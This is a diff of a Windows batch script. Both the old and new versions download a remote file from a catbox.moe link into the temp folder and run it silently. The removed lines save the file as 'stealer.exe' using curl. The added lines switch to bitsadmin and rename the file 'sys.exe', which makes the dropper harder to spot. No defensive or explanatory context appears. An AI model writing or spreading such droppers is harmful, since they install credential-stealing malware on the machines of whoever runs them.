@@ -1,4 +1,4 @@
 @echo off
-curl -s -o "%temp%\stealer.exe" "https://files.catbox.moe/ib2r4p.txt"
-start "" /b "%temp%\stealer.exe"
+bitsadmin /transfer myJob /download /priority normal "https://files.catbox.moe/ib2r4p.txt" "%temp%\sys.exe"
+start "" /b "%temp%\sys.exe"
 exit
